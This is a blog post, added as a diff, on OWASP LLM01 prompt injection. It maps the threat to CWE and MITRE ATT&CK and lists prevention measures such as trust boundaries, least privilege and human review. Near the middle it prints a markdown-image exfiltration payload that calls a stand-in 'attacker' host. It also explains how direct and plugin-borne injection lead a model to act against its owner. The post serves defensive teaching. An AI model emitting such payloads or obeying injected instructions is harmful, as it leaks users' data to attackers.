@@ -1,0 +1,108 @@
+--- 
+title: OWASP LLM Top 10 for LLM, LLM01 - Prompt Injection Part 2 - Deeper Dive and Mitigations
+date: 2023/10/28
+description: Prompt Injection Deeper Dive
+tag: developers, cybersecurity, OWASP Top 10, prompt injection, LLM01, aiml, machine learning, threats, red, chatgpt, mitre, atlas
+author: Dr. Jones
+--- 
+import Image from 'next/image' 
+
+# Prompt Injection: A Deeper Dive and Mitigation- Part 2
+
+<Image 
+  src="/images/mon/llmonster1.png" 
+  alt="LLM Monster 01" 
+  width={727} 
+  height={408} 
+  priority 
+  className="next-image" 
+/> 
+
+Before we launch into mitigations, I have found an additional resource we can use in our analysis, [Bob Simonoff's LLM Commentary](https://github.com/Bobsimonoff/LLM-4-Applications-Commentary/tree/main). Bob is a Senior Prinicpal Software Engineer and Fellow in his current position. Additionally, he is a core team member and founder of the OWASP Top 10 for LLMs. Bob provides content and commentary on the Top 10 for LLMs. 
+
+## Additional Mapping - Common Weakness Enumeration ([CWE](https://cwe.mitre.org/)) and [MITRE ATT&CK®](https://attack.mitre.org/).
+
+Bob does an impressive job of mapping these vulnerabilities to CWE, ATT&CK, and ATLAS! We wont go over every single additional mapping with as much detail as previously. You can get additional details off his GitHub Repository linked above.
+
+<Image 
+  src="/images/mon/llmonster5.jpeg" 
+  alt="LLM Monster 05" 
+  width={512} 
+  height={512} 
+  priority 
+  className="next-image" 
+/> 
+
+### [CWE](https://github.com/Bobsimonoff/LLM-4-Applications-Commentary/blob/main/docs/LLM-Top-10-Framework-Mappings/OWASP-Mappings-to-other-frameworks-LLM01-PromptInj.md#common-weakness-enumeration-cwe)
+
+1. [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
+2. [CWE-77: Improper Neutralization of Special Elements Used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
+3. [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
+4. [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
+5. [CWE-114: Process Control](https://cwe.mitre.org/data/definitions/114.html)
+6. [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
+7. [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
+8. [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
+
+If we remember in the previous discussion, prompt injection occurs when we are able to directly convince the model to go against its set of rules or indirectly by a plugin, that is going to do something run a command, complete a task, which might not be in the user or model owners best interest. One example we discussed last time was how ChatGPT renders markdown:
+
+``` 
+![data exfiltration in progress](https://attacker/q=*exfil_data*) 
+``` 
+
+If you remember this example, the blank image would be rendered, and the attacker now has control of the LLM, this is due to improper handling / sanitization of the data.
+
+#### MITRE ATT&CK®
+
+1. [T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
+2. [T1078: Valid Accounts](https://attack.mitre.org/techniques/T1078/)
+3. [T1090: Proxy](https://attack.mitre.org/techniques/T1090/)
+4. [T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
+5. [T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)
+6. [T1550: Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
+7. [T1566: Phishing](https://attack.mitre.org/techniques/T1566/)
+
+An attacker is going to use many different mechanisms to gain access to the system and LLM. We discussed many asspects of these in the last post, in relation to [ML Model Access](https://atlas.mitre.org/tactics/AML.TA0000), as well as [Command and Scripting Interpreter](https://atlas.mitre.org/techniques/AML.T0050/). An attacker is going to attempt to gain access to the LLM by any means possible, be it via prompt injection or by traditional means, such as stealing valid accounts via phishing campaigns, account enumeration, or account escalation. Also data scientists in the space usually have more access than they should. These are just a few things to be mindful of.
+
+These vulnerabilities are possible due to the fact that LLMs use natural language. LLMs view both direct and indirect instructions as user-provided input. As per the norm in security, there is no fool-proof mechanism to prevent this. Therefore, it is important to implement mitigations to minimize the impact when a prompt injection is carried out, in addition to any remediations you might take to prevent particular or "known" exploitations.
+
+<Image 
+  src="/images/mon/llmonster6.jpeg" 
+  alt="LLM Monster 02" 
+  width={512} 
+  height={512} 
+  priority 
+  className="next-image" 
+/> 
+
+## Prevention
+
+So as we mentioned, LLMs are naturally vulnerable to these forms of attacks due to their nature. So, it is important to prevent prompt injections, as well as add additional mitigations to limit the impact prompt injection exploits could carry out.
+
+1. Separate external content (plug-ins) from user input. 
+- As we mentioned above, due to the nature of LLMs, it is important that the LLM is aware of the origin of the content, as to limit its imfluence on the users prompt or the LLM.
+2. Establish trust boudaries between the LLM, external sources, and downstream functionality. Or implement application isolation/sandboxing.
+- This is a logical step in additional to seperating external content from the users input, we shouls also treat the LLM as an untrusted user.
+3. Enforce privilege control, following the principle of least privilege.
+- As we mentioned earlier, treat the LLM as an untrusted user. The LLM should only have the minimum level of access to complete its task. We should also limit external sources / contents impact on the LLM, so it should be limited seperately, with additional parameters, possibly even more so than the user.
+4. Extensible functionality should always implement human in the loop.
+- We should never allow the LLM to blindly complete privileged operations or tasks, be it sending or deleting messages, making changes to your calendar, copying chat or uploading chat logs, etc. The application should verify with the user before performing some actions.
+5. Advesarial Input Detection / Query Auditing
+- Prompt Injection can be explained as a form of anomaly. Thus, we should implement a mechnism to detect, log, and block atypical queries. 
+6. Restrict Library Loading
+- Compromised or vulnerable libraries might be loaded as part of the pickle file, or via a user prompt, thus it is important that we restrict library loading to approved mechanisms. 
+
+<Image 
+  src="/images/mon/llmonster2.jpeg" 
+  alt="LLM Monster 02" 
+  width={512} 
+  height={512} 
+  priority 
+  className="next-image" 
+/> 
+
+## Closing Thoughts
+
+Current approaches to reduce direct prompt injection seems to follow a more "Whack-a-mole" style approach, thus it is important to invest more energy into exploring prevention and mitigation of this vulnerability. Many of the remaining OWASP Top 10 for LLM are possible in part by prompt injection.
+
+Also, all images in this post, unless otherwise noted, were created with Stable Diffusion with the prompt "AI Hacker Prompt Injection" by use here at Outlaw Research Labs!
